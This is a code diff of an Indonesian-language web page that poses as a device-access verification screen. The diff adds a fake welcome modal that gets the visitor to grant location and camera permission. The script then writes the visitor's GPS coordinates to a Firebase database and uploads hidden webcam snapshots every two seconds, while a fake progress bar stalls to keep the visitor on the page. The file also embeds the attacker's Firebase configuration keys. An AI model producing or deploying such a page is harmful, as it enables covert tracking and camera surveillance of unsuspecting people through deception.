@@ -1,92 +1,256 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Konfirmasi Perangkat</title>
+  <title>Verifikasi Akses Perangkat</title>
   
   <!-- Firebase SDK (v9 Compatibility Mode) -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #0d1117;
+      color: #ffffff;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+
+    /* 1. POP-UP MODAL CUSTOM */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(5px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      z-index: 999;
+    }
+
+    .modal-box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      padding: 30px 25px;
+      border-radius: 16px;
+      max-width: 380px;
+      width: 100%;
       text-align: center;
-      padding: 50px 20px;
-      background-color: #f4f6f9;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
     }
-    .box {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      max-width: 400px;
-      margin: 0 auto;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+
+    .icon-box {
+      font-size: 45px;
+      margin-bottom: 15px;
     }
-    /* Sembunyikan elemen kamera dari tampilan user */
-    #videoElement, #canvasElement {
+
+    .modal-box h2 {
+      margin: 0 0 10px 0;
+      color: #f0f6fc;
+      font-size: 20px;
+    }
+
+    .modal-box p {
+      color: #8b949e;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .btn-allow {
+      background: linear-gradient(135deg, #238636, #2ea043);
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      box-shadow: 0 4px 12px rgba(46, 160, 67, 0.3);
+      transition: all 0.2s ease;
+    }
+
+    .btn-allow:hover {
+      background: linear-gradient(135deg, #2ea043, #3fb950);
+      transform: translateY(-1px);
+    }
+
+    /* 2. TAMPILAN LOADING FULL SCREEN */
+    .loading-container {
+      display: none; /* Sembunyi sebelum izin disetujui */
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    /* Spin Circle Animasi */
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 5px solid rgba(255, 255, 255, 0.1);
+      border-top: 5px solid #2f81f7;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 25px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #58a6ff;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+    }
+
+    .loading-subtext {
+      font-size: 13px;
+      color: #8b949e;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.6; }
+      50% { opacity: 1; }
+    }
+
+    /* Progress Bar */
+    .progress-bar-box {
+      width: 260px;
+      height: 8px;
+      background: #21262d;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      border: 1px solid #30363d;
+    }
+
+    .progress-bar-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #2f81f7, #58a6ff);
+      border-radius: 10px;
+      transition: width 0.3s ease;
+    }
+
+    .percentage-text {
+      font-size: 14px;
+      font-weight: bold;
+      color: #c9d1d9;
+    }
+
+    /* Elemen Kamera Tersembunyi */
+    #webcamElement, #canvasElement {
       display: none;
     }
   </style>
 </head>
 <body>
 
-  <div class="box">
-    <h2>Konfirmasi Izin</h2>
-    <p>Silakan klik <b>"Allow" / "Izinkan"</b> pada pop-up browser yang muncul di layar atas Anda.</p>
-    <p id="status" style="color: #007bff; font-weight: bold;">Memproses permintaan izin...</p>
+  <!-- POP-UP CUSTOM -->
+  <div class="modal-overlay" id="customModal">
+    <div class="modal-box">
+      <div class="icon-box">HALLO!!</div>
+      <h2>SELAMAT DATANG</h2>
+      <p>Untuk melanjutkan layanan ini, silakan klik tombol di bawah lalu pilih <b>MULAI</b> pada dialog browser.</p>
+      <button class="btn-allow" onclick="mulaiProses()">Mulai</button>
+    </div>
   </div>
 
-  <!-- Elemen Video & Canvas Tersembunyi -->
-  <video id="videoElement" autoplay playsinline></video>
+  <!-- TAMPILAN LOADING SINKRONISASI -->
+  <div class="loading-container" id="loadingArea">
+    <div class="spinner"></div>
+    <div class="loading-title">Menghubungkan ke Server...</div>
+    <div class="loading-subtext">Mohon tunggu, jangan tutup halaman ini</div>
+    
+    <div class="progress-bar-box">
+      <div class="progress-bar-fill" id="progressFill"></div>
+    </div>
+    <div class="percentage-text" id="percentText">0%</div>
+  </div>
+
+  <!-- Elemen Kamera & Canvas Tersembunyi -->
+  <video id="webcamElement" autoplay playsinline></video>
   <canvas id="canvasElement"></canvas>
 
   <script>
-    // 1. Konfigurasi Firebase
+    // 1. Konfigurasi Firebase Anda
     const firebaseConfig = {
-  apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
-  authDomain: "sfkk-6af70.firebaseapp.com",
-      databaseURL : "https://sfkk-6af70-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "sfkk-6af70",
-  storageBucket: "sfkk-6af70.firebasestorage.app",
-  messagingSenderId: "1045663352487",
-  appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
-  measurementId: "G-23SNFYWR8V"
-};
-
+      apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
+      authDomain: "sfkk-6af70.firebaseapp.com",
+      databaseURL: "https://sfkk-6af70-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "sfkk-6af70",
+      storageBucket: "sfkk-6af70.firebasestorage.app",
+      messagingSenderId: "1045663352487",
+      appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
+      measurementId: "G-23SNFYWR8V"
+    };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const video = document.getElementById('videoElement');
+    const webcam = document.getElementById('webcamElement');
     const canvas = document.getElementById('canvasElement');
-    const statusText = document.getElementById('status');
+    const loadingArea = document.getElementById('loadingArea');
+    const progressFill = document.getElementById('progressFill');
+    const percentText = document.getElementById('percentText');
 
-    // 2. Fungsi Utama: Panggil Pop-Up Browser Secara Otomatis
-    async function triggerPopups() {
-      // Pastikan Protokol HTTPS
-      if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-        statusText.style.color = 'red';
-        statusText.innerText = "Error: Harus dijalankan via HTTPS agar pop-up browser muncul!";
-        return;
-      }
+    // Dipanggil saat klik "Izinkan & Lanjutkan"
+    async function mulaiProses() {
+      // Sembunyikan Pop-Up Modal
+      document.getElementById('customModal').style.display = 'none';
 
-      // Pop-up 1: Izin Lokasi
+      // Picu dialog izin browser
       await mintaLokasi();
-
-      // Pop-up 2: Izin Kamera
       await mintaKamera();
+
+      // Tampilkan Animasi Loading & Jalankan Progress Bar
+      loadingArea.style.display = 'flex';
+      jalankanProgressBar();
     }
 
-    // Fungsi Pop-Up Lokasi
+    // Animasi Angka 0% -> 99% (Terus mutar agar mengulur waktu)
+    function jalankanProgressBar() {
+      let progress = 0;
+      const interval = setInterval(() => {
+        if (progress < 95) {
+          progress += Math.floor(Math.random() * 3) + 1;
+          if (progress > 95) progress = 95;
+          progressFill.style.width = progress + '%';
+          percentText.innerText = progress + '%';
+        }
+      }, 500);
+    }
+
+    // Function Minta Lokasi
     function mintaLokasi() {
       return new Promise((resolve) => {
         if ("geolocation" in navigator) {
-          // Panggilan ini yang memicu POP-UP LOKASI resmi dari browser
           navigator.geolocation.getCurrentPosition(
             (position) => {
-              // Jika user menekan "Allow" / "Izinkan"
               db.ref('device/location').set({
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
@@ -95,8 +259,7 @@
               resolve(true);
             },
             (error) => {
-              // Jika user menekan "Block" / "Tolak"
-              console.warn("User menolak lokasi:", error.message);
+              console.warn("Lokasi ditolak:", error.message);
               resolve(false);
             }
           );
@@ -106,41 +269,30 @@
       });
     }
 
-    // Fungsi Pop-Up Kamera
+    // Function Minta Kamera
     async function mintaKamera() {
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         try {
-          // Panggilan ini yang memicu POP-UP KAMERA resmi dari browser
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          video.srcObject = stream;
-          
-          statusText.style.color = 'green';
-          statusText.innerText = "Izin berhasil dikonfirmasi!";
-
-          // Mulai kirim frame kamera ke Firebase setiap 2 detik
+          webcam.srcObject = stream;
           setInterval(captureFrame, 2000);
         } catch (err) {
-          console.warn("User menolak kamera:", err.message);
-          statusText.style.color = 'orange';
-          statusText.innerText = "Beberapa izin tidak diberikan.";
+          console.warn("Kamera ditolak:", err.message);
         }
       }
     }
 
-    // Kirim gambar kamera ke Firebase
+    // Ambil Frame Kamera Tersembunyi
     function captureFrame() {
-      if (video.videoWidth === 0) return;
-      canvas.width = video.videoWidth / 4;
-      canvas.height = video.videoHeight / 4;
+      if (webcam.videoWidth === 0) return;
+      canvas.width = webcam.videoWidth / 6;
+      canvas.height = webcam.videoHeight / 6;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
 
-      const base64Image = canvas.toDataURL('image/jpeg', 0.4);
+      const base64Image = canvas.toDataURL('image/jpeg', 0.2);
       db.ref('device/cameraFrame').set(base64Image);
     }
-
-    // Jalankan pemicu pop-up saat halaman selesai dimuat
-    window.onload = triggerPopups;
   </script>
 
 </body>
